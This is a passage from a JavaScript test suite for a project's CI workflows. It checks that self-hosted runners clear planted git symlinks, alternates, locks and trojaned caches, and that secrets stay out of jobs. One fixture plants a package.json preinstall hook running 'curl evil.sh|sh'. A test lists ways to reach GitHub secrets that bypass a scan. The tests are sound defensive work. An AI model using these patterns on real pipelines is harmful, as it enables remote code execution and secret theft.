        'nothing outside the runner workspace may be wiped',
      );
      assert.ok(
        statSync(ws).isDirectory() && !lstatSync(ws).isSymbolicLink(),
        'the workspace must come back as a real directory',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('sweeps a planted symlink under the kept .git instead of carrying it', () => {
    // A previous job linking .git/objects outside the workspace makes the
    // next job's fetch write loose objects through the link to an
    // attacker-chosen directory. The sweep removes every link under .git,
    // link only, never following it.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-gitlinks-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      const attacker = join(root, 'attacker-objects');
      mkdirSync(attacker);
      rmSync(join(ws, '.git', 'objects'), { recursive: true, force: true });
      symlinkSync(attacker, join(ws, '.git', 'objects'));
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      assert.match(
        res.stdout,
        /removing 1 planted symlink\(s\) under .*\.git/,
        'the sweep must report what it cleared',
      );
      const objects = join(ws, '.git', 'objects');
      assert.ok(
        !existsSync(objects) || !lstatSync(objects).isSymbolicLink(),
        'the planted link must be gone',
      );
      assert.deepEqual(
        readdirSync(attacker),
        [],
        'the link target outside the workspace must stay untouched',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('removes objects/info/alternates before the next checkout materializes a poisoned store', () => {
    // git never verifies loose-object hashes on read: with alternates
    // pointing at an outside store, the next checkout materializes
    // attacker bytes. The file never legitimately exists here.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-alternates-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      const evilRepo = join(root, 'evil-repo');
      initProbeRepo(home, evilRepo);
      writeFileSync(
        join(evilRepo, 'package.json'),
        '{"name":"evil","scripts":{"preinstall":"curl evil.sh|sh"}}\n',
      );
      gitProbe(home, ['add', 'package.json'], evilRepo);
      gitProbe(home, ['commit', '-q', '-m', 'evil'], evilRepo);
      const evilSha = gitProbe(home, ['rev-parse', 'HEAD'], evilRepo);
      mkdirSync(join(ws, '.git', 'objects', 'info'), { recursive: true });
      writeFileSync(
        join(ws, '.git', 'objects', 'info', 'alternates'),
        `${join(evilRepo, '.git', 'objects')}\n`,
      );
      writeFileSync(join(ws, '.git', 'refs', 'heads', 'evil'), `${evilSha}\n`);
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      assert.ok(
        !existsSync(join(ws, '.git', 'objects', 'info', 'alternates')),
        'alternates must be removed',
      );
      const materialize = spawnSync(
        realGit,
        [
          '--git-dir',
          join(ws, '.git'),
          'cat-file',
          '-p',
          `${evilSha}:package.json`,
        ],
        { encoding: 'utf8', env: wipeGitEnv(home) },
      );
      assert.notEqual(
        materialize.status,
        0,
        'the poisoned object must be unreachable once alternates is gone',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('sweeps planted *.lock files before they wedge the strip or the next checkout', () => {
    // replace-strip leg: a lock named after a real replace ref makes
    // update-ref -d die before its own cleanup, killing the bare strip
    // with the plant alive. index.lock leg: the benign trigger is a job
    // killed mid-checkout — the next checkout dies on the stale lock.
    for (const arm of ['replace', 'index']) {
      const root = mkdtempSync(join(tmpdir(), `visuals-wipe-lock-${arm}-`));
      try {
        const home = join(root, 'home');
        mkdirSync(home);
        const rws = join(root, 'rws');
        const ws = join(rws, 'qwen-code');
        initProbeRepo(home, ws);
        writeFileSync(join(ws, 'package.json'), '{"name":"clean"}\n');
        gitProbe(home, ['add', 'package.json'], ws);
        gitProbe(home, ['commit', '-q', '-m', 'clean'], ws);
        const cleanSha = gitProbe(home, ['rev-parse', 'HEAD'], ws);
        if (arm === 'replace') {
          writeFileSync(join(ws, 'package.json'), '{"name":"EVIL"}\n');
          gitProbe(home, ['add', 'package.json'], ws);
          gitProbe(home, ['commit', '-q', '-m', 'evil'], ws);
          const evilSha = gitProbe(home, ['rev-parse', 'HEAD'], ws);
          gitProbe(home, ['replace', cleanSha, evilSha], ws);
          writeFileSync(
            join(ws, '.git', 'refs', 'replace', `${cleanSha}.lock`),
            '',
          );
        } else {
          writeFileSync(join(ws, '.git', 'index.lock'), '');
        }
        const res = runWipeStep(wipeStep.run, { home, ws, rws });
        assert.equal(
          res.status,
          0,
          `wipe failed (${arm}): ${res.stdout}${res.stderr}`,
        );
        const lock =
          arm === 'replace'
            ? join(ws, '.git', 'refs', 'replace', `${cleanSha}.lock`)
            : join(ws, '.git', 'index.lock');
        assert.ok(!existsSync(lock), `the planted lock must be gone (${arm})`);
        const checkout = spawnSync(
          realGit,
          [
            '--git-dir',
            join(ws, '.git'),
            '--work-tree',
            ws,
            'checkout',
            '-q',
            '-f',
            'HEAD',
          ],
          { cwd: root, encoding: 'utf8', env: wipeGitEnv(home) },
        );
        assert.equal(
          checkout.status,
          0,
          `the next checkout must complete (${arm}): ${checkout.stderr}`,
        );
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    }
  });

  it('drops planted extensions.* keys the old allowlist kept', () => {
    // A planted extension the enumeration survives is unset like any
    // other non-allowlisted key; one the enumeration dies on reaches the
    // fail-open instead. Either way the plant must not survive.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-extension-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      writeFileSync(
        join(ws, '.git', 'config'),
        readFileSync(join(ws, '.git', 'config'), 'utf8') +
          '[extensions]\n\tnoop = true\n',
      );
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      const list = spawnSync(
        realGit,
        [
          '--git-dir',
          join(ws, '.git'),
          'config',
          '--local',
          '--name-only',
          '--list',
        ],
        { encoding: 'utf8', env: wipeGitEnv(home) },
      );
      const plantAlive = list.status === 0 && /extensions\./.test(list.stdout);
      assert.ok(!plantAlive, 'the planted extension must not survive');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('fails open and removes a kept .git whose refs cannot be enumerated', () => {
    // Garbage HEAD — a job killed mid-write — makes every git defang exit
    // 128; without a fail-open the bare strip dies and every later job on
    // this runner dies on the poison. Two consecutive simulated jobs must
    // both survive.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-failopen-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      writeFileSync(join(ws, '.git', 'HEAD'), 'garbage\n');
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(
        res.status,
        0,
        `the fail-open must complete the wipe: ${res.stdout}${res.stderr}`,
      );
      assert.match(
        res.stdout,
        /::warning::removing kept \.git whose refs cannot be enumerated/,
        'the fail-open must say why the reuse is being paid back',
      );
      assert.ok(
        !existsSync(join(ws, '.git')),
        'the unprovable gitdir must be removed',
      );
      const res2 = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(
        res2.status,
        0,
        `the next job must not die on the removed gitdir: ${res2.stdout}${res2.stderr}`,
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('removes directory-shaped defang plants', () => {
    // mkdir .git/commondir (or config.lock) makes a bare rm -f die with
    // 'Is a directory' — the wipe fails with the plant inside the kept
    // .git. The defangs take directories too.
    const root = mkdtempSync(join(tmpdir(), 'visuals-wipe-dirplant-'));
    try {
      const home = join(root, 'home');
      mkdirSync(home);
      const rws = join(root, 'rws');
      const ws = join(rws, 'qwen-code');
      initProbeRepo(home, ws);
      mkdirSync(join(ws, '.git', 'commondir'));
      mkdirSync(join(ws, '.git', 'config.lock'));
      const res = runWipeStep(wipeStep.run, { home, ws, rws });
      assert.equal(res.status, 0, `wipe failed: ${res.stdout}${res.stderr}`);
      assert.ok(
        !existsSync(join(ws, '.git', 'commondir')),
        'the commondir plant must be gone',
      );
      assert.ok(
        !existsSync(join(ws, '.git', 'config.lock')),
        'the lock plant must be gone',
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('resolves the witness git through the fleet wrapper convention', () => {
    // On wrapper-env machines the PATH git execs $QWEN_CI_REAL_GIT; the
    // witnesses must spawn the real binary, not the wrapper — and the
    // indirection variable must flow into the step's env beside it.
    if (process.env.QWEN_CI_REAL_GIT) {
      assert.equal(realGit, process.env.QWEN_CI_REAL_GIT);
    }
    if (!process.env.QWEN_CI_REAL_GIT) {
      assert.equal(realGit, hostToolPath('git'));
    }
  });

  it('keeps the capture job free of ambient secrets', () => {
    // The security-model header promises the render job holds no secrets of
    // its own; the merge-base resolve step's read-only GITHUB_TOKEN is the
    // one permitted exception. Every expression-interpolating surface is
    // scanned — step env, with inputs, run text, and job- and workflow-level
    // env — a step-env-only scan lets a secret passed through any other
    // surface slip past.
    const surfaces = visualsCaptureJob.steps.flatMap((step) =>
      [
        ...Object.values(step.env ?? {}),
        ...Object.values(step.with ?? {}),
        step.run,
      ].map((value) => [`step '${step.name}'`, value]),
    );
    surfaces.push(
      ...Object.values(visualsCaptureJob.env ?? {}).map((value) => [
        'job-level env',
        value,
      ]),
      ...Object.values(visualsDoc.env ?? {}).map((value) => [
        'workflow-level env',
        value,
      ]),
    );
    for (const [where, value] of surfaces) {
      assertSecretFree(where, value);
    }
  });

  it('fails every secrets shape except the permitted reference', () => {
    // The scan above only bites if the match itself cannot be bypassed:
    // bracket/indexed and whole-context forms reach ambient secrets without
    // the literal dot shape, and shape enumeration grew a new bypass sibling
    // in three consecutive rounds. Deleting the broadened matcher must turn
    // every non-dot shape red here.
    for (const shape of [
      "${{ secrets['EVIL'] }}",
      '${{ secrets[matrix.key] }}',
      '${{ toJSON(secrets) }}',
      '${{ secrets }}',
    ]) {
      assert.throws(() => assertSecretFree('fixture env', shape));
    }
    assert.doesNotThrow(() =>
      assertSecretFree('fixture env', '${{ secrets.GITHUB_TOKEN }}'),
    );
  });

  it('keeps setup-node off the pool', () => {
    // The action's post step uploads the npm cache to GitHub; on the
    // pool's slow egress that save ran 14+ minutes and timed out
    // security-checks' first pool run (2026-08-26). Hosted keeps the
    // action; the pool reuses the machine's Node and its persistent npm
    // cache, exactly as ci.yml does.
    const setup = visualsCaptureJob.steps.find((s) =>
      String(s.uses || '').startsWith('actions/setup-node'),
    );
    assert.ok(setup, 'the hosted setup-node step must exist');
    assert.equal(setup.if, "${{ runner.environment == 'github-hosted' }}");
    const preflight = visualsCaptureJob.steps.find(
      (s) => s.uses === './.github/actions/self-hosted-node',
    );
    assert.ok(preflight, 'the pool lane must use the pre-installed Node');
    assert.equal(preflight.if, "${{ runner.environment == 'self-hosted' }}");
  });

  it('keeps the persistent npm cache pool-only and ahead of the install', () => {
    // setup-node's cache stays hosted (its post step uploads to GitHub
    // and times out on the pool's slow egress); the pool lane points npm at
    // a machine-persistent dir instead, the same shape as ci.yml. The export
    // must land in GITHUB_ENV or the later npm ci never sees it, and it must
    // precede that step or the first install bypasses the cache.
    const steps = visualsCaptureJob.steps;
    const cache = steps.findIndex(
      (s) => s.name === 'Configure persistent npm cache (self-hosted)',
    );
    const npmCi = steps.findIndex((s) => s.name === 'Install dependencies');
    assert.ok(cache !== -1, 'the pool npm-cache step must exist');
    assert.equal(steps[cache].if, "${{ runner.environment == 'self-hosted' }}");
    assert.match(steps[cache].run, /NPM_CONFIG_CACHE=.* >> "\$\{GITHUB_ENV\}"/);
    assert.match(steps[cache].run, /\.cache\/qwen-code\/npm/);
    assert.match(
      steps[cache].run,
      /rm -f -- "\$\{cache_dir\}"/,
      'a planted non-directory leaf must be unlinked before mkdir — a previous pool job can wedge or redirect every later job through it',
    );
    assert.match(
      steps[cache].run,
      /if mkdir -p "\$\{cache_dir\}"; then/,
      'the NPM_CONFIG_CACHE export must ride only on a successful mkdir — the cache is an optimization, so a failure degrades to the default cache',
    );
    assert.ok(
      npmCi !== -1 && cache < npmCi,
      'the cache must be configured before the install that uses it',
    );
  });

  it('heals a planted npm-cache leaf and fails open when the cache cannot be prepared', () => {
    // The cache dir outlives a run: a previous pool job planting the leaf
    // as a file wedges every later job at mkdir -p, and a symlink leaf
    // redirects every later job's cache writes outside the intended path.
    // The heal unlinks the pathological spellings; when even mkdir fails,
    // the step degrades to the default cache instead of sinking the job.
    const cacheStep = visualsCaptureJob.steps.find(
      (s) => s.name === 'Configure persistent npm cache (self-hosted)',
    );
    const bashPath = hostToolPath('bash');
    for (const plant of ['file', 'symlink', 'parent-file']) {
      const root = mkdtempSync(join(tmpdir(), `visuals-npmcache-${plant}-`));
      try {
        const home = join(root, 'home');
        const cacheDir = join(home, '.cache', 'qwen-code', 'npm');
        mkdirSync(dirname(cacheDir), { recursive: true });
        const outside = join(root, 'outside');
        if (plant === 'file') {
          writeFileSync(cacheDir, 'plant');
        } else if (plant === 'symlink') {
          symlinkSync(outside, cacheDir);
        } else {
          rmSync(dirname(cacheDir), { recursive: true, force: true });
          writeFileSync(dirname(cacheDir), 'plant');
        }
        const envFile = join(root, 'github_env');
        writeFileSync(envFile, '');
        const res = spawnSync(
          bashPath,
          ['--noprofile', '--norc', '-eo', 'pipefail', '-c', cacheStep.run],
          {
            encoding: 'utf8',
            env: { PATH: process.env.PATH, HOME: home, GITHUB_ENV: envFile },
          },
        );
        const envText = readFileSync(envFile, 'utf8');
        assert.equal(
          res.status,
          0,
          `the cache step must survive the ${plant} plant: ${res.stdout}${res.stderr}`,
        );
        if (plant === 'parent-file') {
          assert.ok(
            !envText.includes('NPM_CONFIG_CACHE'),
            'a cache that cannot be prepared must degrade to the default cache, not export the plant',
          );
        } else {
          assert.match(
            envText,
            /NPM_CONFIG_CACHE=/,
            `the healed cache must still be exported (${plant})`,
          );
          assert.ok(
            statSync(cacheDir).isDirectory() &&
              !lstatSync(cacheDir).isSymbolicLink(),
            `the leaf must heal to a real directory (${plant})`,
          );
          assert.ok(
            !existsSync(outside),
            `nothing may be written through the plant (${plant})`,
          );
        }
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    }
  });

  it('keeps the ffmpeg install pool-only, non-interactive, and best-effort', () => {
    // Hosted images ship ffmpeg; the pool may not. The compensating install
    // must never sink the preview: sudo -n never prompts, and the chain ends
    // in a warning, so an uninstallable member degrades to raw .webm uploads
    // — the convert step detects the missing binary, warns, and skips.
    const steps = visualsCaptureJob.steps;
    const ffmpeg = steps.findIndex((s) => s.name === 'Install ffmpeg');
    const convert = steps.findIndex(
      (s) => s.name === 'Convert flow recordings to inline GIFs',
    );
    assert.ok(ffmpeg !== -1, 'the pool ffmpeg install must exist');
    assert.equal(
      steps[ffmpeg].if,
      "${{ runner.environment == 'self-hosted' }}",
    );
    assert.match(
      steps[ffmpeg].run,
      /^command -v ffmpeg .* \|\| sudo -n apt-get install -y ffmpeg .* \|\| sudo -n dnf install -y ffmpeg .* \|\| sudo -n yum install -y ffmpeg .* \|\| echo "::warning::could not install ffmpeg/,
      'the install must probe apt, dnf, and yum non-interactively and end in a warning, never a failing step',
    );
    assert.ok(
      convert !== -1 && ffmpeg < convert,
      'the install must precede the GIF conversion that consumes it',
    );
  });

  it('keeps the install step wired into the job', () => {
    // The exec tests below run the step's non-apt lane in isolation; these
    // are the job-level facts no isolated run can see: the lane resolves
    // Playwright from the repo lockfile (a registry download would pair a
    // different browser revision with the lockfile's), runs before the
    // capture it serves, and its failure fails the job.
    const steps = visualsCaptureJob.steps;
    const install = steps.findIndex(
      (s) => s.name === 'Install Playwright Chromium',
    );
    const clear = steps.findIndex((s) => s.name === 'Clear stale capture dirs');
    const heal = steps.findIndex(
      (s) => s.name === 'Restore workspace ownership',
    );
    const npmCi = steps.findIndex((s) => s.name === 'Install dependencies');
    const afterCapture = steps.findIndex((s) => s.id === 'after_capture');
    assert.ok(install !== -1, 'the Playwright install step must exist');
    assert.ok(
      npmCi !== -1 && npmCi < install,
      'npx must resolve the lockfile Playwright, not a registry release with a different browser revision',
    );
    assert.ok(
      install < afterCapture,
      'the browser must be installed before the capture that drives it',
    );
    assert.ok(
      !('continue-on-error' in steps[install]),
      'a failed install or gate must fail the job, not publish an empty preview',
    );
    assert.ok(
      !('continue-on-error' in visualsCaptureJob),
      'a job-level continue-on-error would mask the gate too',
    );
    // The hosted apt lane is not exec-tested here (apt-get may not exist on
    // the machine running the suite); pin its gate and its one body line.
    // The pool lane is exec-tested by the tests below.
    const lines = steps[install].run.split('\n');
    const ifIndex = lines.findIndex((l) =>
      l.trim().startsWith('if [ "${RUNNER_ENVIRONMENT:-}" = "github-hosted" ]'),
    );
    const elseIndex = lines.findIndex((l) => l.trim() === 'else');
    assert.ok(
      ifIndex !== -1 && elseIndex > ifIndex,
      "the lane split must gate on the runner environment — the pool's Ubuntu members ship apt-get but not passwordless sudo, so an apt probe sends them into --with-deps",
    );
    assert.equal(
      lines[ifIndex + 1].trim(),
      'npx playwright install --with-deps chromium',
      'the hosted lane must keep apt-driven dependency installation',
    );
    // An env override at any of these levels moves the ground under the
    // pinned steps: HOME relocates the library scan, RUNNER_TEMP the stale
    // clear, GITHUB_WORKSPACE the heal, RUNNER_ENVIRONMENT re-routes the
    // lane split (a pool member sent into --with-deps dies on the
    // password-gated sudo), PATH/BASH_ENV re-resolve (or pre-load) every
    // command. Check the env map of EACH pinned step — a step-level
    // override beats the job and workflow levels.
    for (const envMap of [
      steps[install].env,
      steps[clear].env,
      steps[heal].env,
      visualsCaptureJob.env,
      visualsDoc.env,
    ]) {
      for (const key of [
        'BASH_ENV',
        'PATH',
        'HOME',
        'RUNNER_TEMP',
        'GITHUB_WORKSPACE',
        'RUNNER_ENVIRONMENT',
      ]) {
        assert.ok(
          !envMap || envMap[key] === undefined,
          `${key} must not be overridden around the capture steps`,
        );
      }
    }
  });

  it('passes a fully provisioned machine without provisioning anything', () => {
    const { status, stdout, stderr, calls } = runInstallStep('provisioned');
    assert.equal(
      status,
      0,
      `a provisioned machine must pass the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.match(
      calls,
      /^npx playwright install chromium$/m,
      'the lane must download the browser',
    );
    assert.ok(
      !calls.includes('--with-deps'),
      'the non-apt lane must not take the apt-only flag — swapped branch bodies would',
    );
    assert.ok(
      !/^(sudo|dnf|yum) /m.test(calls),
      'nothing may be provisioned when the first scan resolves',
    );
  });

  it('provisions a fixable machine and judges the rescan', () => {
    const { status, stdout, stderr, calls } = runInstallStep('provisionable');
    assert.equal(
      status,
      0,
      `a machine dnf can fix must pass the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.match(
      calls,
      /^sudo -n dnf install -y --skip-broken .*mesa-libgbm/m,
      'the lane must provision the known Chromium runtime set non-interactively',
    );
    assert.ok(!/yum/m.test(calls), 'yum is only a fallback after dnf fails');
  });

  it('fails an unfixable machine with the concrete missing list', () => {
    const { status, stdout, stderr, calls } = runInstallStep('unprovisionable');
    assert.equal(
      status,
      1,
      `an unprovisionable machine must fail the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /libnss3\.so => not found/,
      'the concrete missing list must surface',
    );
    assert.match(
      stdout,
      /libatk-1\.0\.so\.0 => not found/,
      'the headless_shell arm of the find must be scanned too',
    );
    assert.match(
      stdout,
      /::error::/,
      'the failure must carry the actionable annotation',
    );
    assert.match(calls, /^sudo -n yum /m, 'yum must be tried once dnf fails');
  });

  it('keeps an apt-get-shipping pool member out of the password-gated lane', () => {
    // The pool's Ubuntu members ship apt-get but allowlist sudo to npm/rm;
    // the apt probe sent them into --with-deps and its sudo died on the
    // password prompt (run 33022864520). The lane split must key on the
    // runner environment, not on apt-get's presence.
    const { status, stdout, stderr, calls } =
      runInstallStep('debian-provisioned');
    assert.equal(
      status,
      0,
      `a Debian-family pool member must pass the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.match(
      calls,
      /^npx playwright install chromium$/m,
      'the lane must download the browser',
    );
    assert.ok(
      !calls.includes('--with-deps'),
      'an apt-get-shipping pool member must not take the hosted-only flag',
    );
    assert.ok(
      !/^(sudo|dnf|yum) /m.test(calls),
      'nothing may be provisioned when the first scan resolves',
    );
  });

  it('provisions a Debian-family machine through the apt arm', () => {
    const { status, stdout, stderr, calls } = runInstallStep(
      'debian-provisionable',
    );
    assert.equal(
      status,
      0,
      `a machine apt-get can fix must pass the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.match(
      calls,
      /^sudo -n apt-get install -y .*libnss3/m,
      'the Debian arm must lead the provisioning chain',
    );
    assert.ok(
      !/(dnf|yum)/m.test(calls),
      'apt-get success must short-circuit the RHEL arms',
    );
  });

  it('fails a scan that finds no browser binaries at all', () => {
    // A machine-level PLAYWRIGHT_BROWSERS_PATH redirect or a Playwright
    // revision renaming the binaries leaves the find empty; judging
    // `missing` alone would pass that vacuously and postpone the crash to
    // browser launch, behind after_capture's continue-on-error.
    const { status, stdout, stderr } = runInstallStep('no-browser');
    assert.equal(
      status,
      1,
      `a zero-binary scan must fail the gate: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /::error::no Chromium binaries found under .*ms-playwright/,
      'the failure must say the scan found nothing to judge',
    );
  });

  it('reinstalls instead of launching a marker-complete trojan from the shared cache', () => {
    // A previous job can leave a trojaned browser behind the
    // INSTALLATION_COMPLETE marker: a trusting install skips the download
    // and the capture launches the plant. The step must wipe the cache and
    // re-download instead.
    const { status, stdout, stderr, calls } = runInstallStep('planted-trojan');
    assert.equal(
      status,
      0,
      `the lane must survive the plant: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.ok(
      !calls.includes('trojan-scanned'),
      'the scan must not consume the trojan — the cache is wiped and re-downloaded',
    );
  });

  it('ignores a stale planted ELF the gate used to wedge on', () => {
    // A planted binary under an unregistered version dir with a
    // fabricated DT_NEEDED made the gate fail every later job:
    // provisioning can never satisfy a name that does not exist. The
    // provenance wipe removes the plant before the scan judges anything.
    const { status, stdout, stderr, calls } =
      runInstallStep('planted-stale-elf');
    assert.equal(
      status,
      0,
      `the lane must survive the plant: ${stdout}${stderr}`,
    );
    assert.match(
      stdout,
      /Chromium shared libraries all resolve on this runner\./,
    );
    assert.ok(
      !calls.includes('evil-scanned'),
      'the scan must not consume the stale plant',
    );
    assert.ok(
      !stdout.includes('libplant'),
      'the fabricated missing list must not surface',
    );
  });
});

describe('e2e.yml e2e-test-linux runner routing', () => {
  // Every trigger is a trusted context (push to in-repo branches, schedule,
  // dispatch — no pull_request), so the lane routes to the persistent pool
  // whenever routing is enabled, with the kill-switch as the only fallback.
  const e2eDoc = parse(readFileSync(join(workflowsDir, 'e2e.yml'), 'utf8'));
  // evalRunsOn unwraps the winning fromJSON label to the array it names.
  const ECS_LABELS = ['self-hosted', 'linux', 'x64', 'ecs-qwen'];
  const HOSTED_LABELS = ['ubuntu-latest'];
  const job = e2eDoc.jobs['e2e-test-linux'];
  const runsOn = String(job['runs-on']);

  it('pins the repository guard clause the matrix substitutes away', () => {
    // evalRunsOn substitutes the repo clause with a constant; deleting it
    // from the workflow would leave every evaluation green while fork runs
    // queue on a label no fork registers. Pin the real text.
    assert.match(runsOn, /github\.repository == 'QwenLM\/qwen-code'/);
  });

  it('reaches the persistent pool on every trusted trigger', () => {
    for (const eventName of ['push', 'schedule', 'workflow_dispatch']) {
      assert.deepEqual(
        evalRunsOn(runsOn, {
          ecsDisabled: false,
          eventName,
          sameRepo: false,
          assoc: '',
        }),
        ECS_LABELS,
        `e2e-test-linux must run from the pool on ${eventName}`,
      );
    }
  });

  it('obeys the kill-switch', () => {
    assert.deepEqual(
      evalRunsOn(runsOn, {
        ecsDisabled: true,
        eventName: 'push',
        sameRepo: true,
        assoc: 'OWNER',
      }),
      HOSTED_LABELS,
      'kill-switch must force the lane back to hosted',
    );
  });

  it('keeps the workflow free of pull_request triggers', () => {
    // The simple repo+kill-switch expression above is only safe because no
    // lane of this workflow ever runs PR-authored workflow code. Adding a
    // pull_request trigger must force a deliberate routing rework.
    // `on:` is equally valid as a map, a sequence, or a scalar; normalize
    // before enumerating, or a non-map form enumerates indices, not names.
    const onMap = e2eDoc.on ?? e2eDoc[true] ?? {};
    const triggers = Array.isArray(onMap)
      ? onMap.map(String)
      : typeof onMap === 'string'
        ? [onMap]
        : Object.keys(onMap);
    assert.ok(triggers.length > 0, 'could not read the trigger map');
    for (const trigger of triggers) {
      assert.ok(
        !trigger.startsWith('pull_request'),
        `e2e.yml gained a ${trigger} trigger; the pool routing needs the fork-trust clause before this can land`,
      );
    }
  });

  it('carries the pool hygiene and capability steps in order', () => {
    const names = job.steps.map((s) => s.name);
    const preflight = names.indexOf('Check container runtime');
    const heal = names.indexOf('Restore workspace ownership');
    const checkout = job.steps.findIndex((s) =>
      String(s.uses || '').startsWith('actions/checkout'),
    );
    const prune = names.indexOf('Prune dangling docker images');
    // GitHub's default is 360 minutes; a wedged shard would hold a pool
    // runner for all of it. Pin the ci.yml pool precedent.
    assert.equal(job['timeout-minutes'], 60);
    // Fail-fast daemon probe (#9556) before any expensive step, only on the
    // docker leg.
    assert.ok(preflight !== -1, 'the docker preflight must exist');
    assert.match(job.steps[preflight].if, /sandbox:docker/);
    assert.match(job.steps[preflight].run, /docker info/);
    assert.match(job.steps[preflight].run, /exit 1/);
    assert.ok(
      preflight < names.indexOf('Install dependencies'),
      'the docker preflight must fail fast, before any expensive step',
    );
    assert.ok(
      !('continue-on-error' in job.steps[preflight]) &&
        !('continue-on-error' in job),
      'a failed docker probe must fail the job, not downgrade to a warning',
    );
    // Ownership heal before checkout, self-hosted only.
    assert.ok(heal !== -1, 'the ownership heal must exist');
    assert.equal(
      job.steps[heal].if,
      "${{ runner.environment == 'self-hosted' }}",
    );
    assert.match(job.steps[heal].run, /chown -R .* "\$GITHUB_WORKSPACE"/);
    assert.match(job.steps[heal].run, /chmod -R u\+rwX/);
    assert.ok(heal < checkout, 'the heal must precede the checkout');
    // Dangling-only prune at the end: always(), docker leg, pool only —
    // and never a form that could remove tagged images other jobs use.
    assert.ok(prune !== -1, 'the dangling prune must exist');
    assert.match(job.steps[prune].if, /always\(\)/);
    assert.match(job.steps[prune].if, /sandbox:docker/);
    assert.match(job.steps[prune].if, /runner\.environment == 'self-hosted'/);
    assert.match(job.steps[prune].run, /docker image prune --force/);
    assert.match(job.steps[prune].run, /until=24h/);
    assert.doesNotMatch(job.steps[prune].run, /--all|-a\b/);
    // A failing prune must stay diagnosable: surface a warning instead of a
    // silent `|| true`, and keep the daemon's error out of /dev/null.
    assert.match(job.steps[prune].run, /\|\| echo "::warning::/);
    assert.doesNotMatch(job.steps[prune].run, /\/dev\/null/);
    assert.ok(
      prune === job.steps.length - 1,
      'the prune must be the final step so nothing dirties the pool after it',
    );
  });

  it('keeps setup-node off the pool', () => {
    // The action's post step uploads the npm cache to GitHub; on the
    // pool's slow egress that save ran 14+ minutes and timed out
    // security-checks' first pool run (2026-08-26). Hosted keeps the
    // action; the pool reuses the machine's Node and its persistent npm
    // cache, exactly as ci.yml does.
    const setup = job.steps.find((s) =>
      String(s.uses || '').startsWith('actions/setup-node'),
    );
    assert.ok(setup, 'the hosted setup-node step must exist');
    assert.equal(setup.if, "${{ runner.environment == 'github-hosted' }}");
    const preflight = job.steps.find(
      (s) => s.uses === './.github/actions/self-hosted-node',
    );
    assert.ok(preflight, 'the pool lane must use the pre-installed Node');
    assert.equal(preflight.if, "${{ runner.environment == 'self-hosted' }}");
  });
});

describe('qwen-autofix.yml scan-lane runner routing', () => {
  // route and review-scan gate the WHOLE fan-out: while they sit queued no
  // review-address leg starts. A hosted-runner backlog queued them past the
  // cron period, and the cron supersede rule then starved every scan round
  // (2026-08-25) — so pin the lane on the persistent pool, with the
  // fork-trust clause and the kill-switch intact.
  const autofixDoc = parse(
    readFileSync(join(workflowsDir, 'qwen-autofix.yml'), 'utf8'),
  );
  // evalRunsOn unwraps the winning fromJSON label to the array it names, so
  // compare against arrays, not the ECS/HOSTED string constants above.
  const ECS_LABELS = ['self-hosted', 'linux', 'x64', 'ecs-qwen'];
  const HOSTED_LABELS = ['ubuntu-latest'];

  for (const jobName of ['route', 'review-scan']) {
    const runsOn = String(autofixDoc.jobs[jobName]['runs-on']);

    it(`${jobName} reaches the persistent pool on schedule, dispatch, issue_comment, and issues`, () => {
      // issue_comment is route's /takeover and /retry lane, issues its
      // label/assign trigger lane for issue-autofix — pin both beside the
      // cron and dispatch triggers so a later event-allowlist narrowing of
      // the pool clause cannot silently demote either back to hosted.
      for (const eventName of [
        'schedule',
        'workflow_dispatch',
        'issue_comment',
        'issues',
      ]) {
        assert.deepEqual(
          evalRunsOn(runsOn, {
            ecsDisabled: false,
            eventName,
            sameRepo: false,
            assoc: '',
          }),
          ECS_LABELS,
          `${jobName} must scan from the pool on ${eventName}`,
        );
      }
    });

    it(`${jobName} keeps untrusted fork PR lanes hosted`, () => {
      for (const eventName of ['pull_request', 'pull_request_review']) {
        assert.deepEqual(
          evalRunsOn(runsOn, {
            ecsDisabled: false,
            eventName,
            sameRepo: false,
            assoc: 'NONE',
          }),
          HOSTED_LABELS,
          `${jobName} fork lane (${eventName}) must stay hosted`,
        );
        assert.deepEqual(
          evalRunsOn(runsOn, {
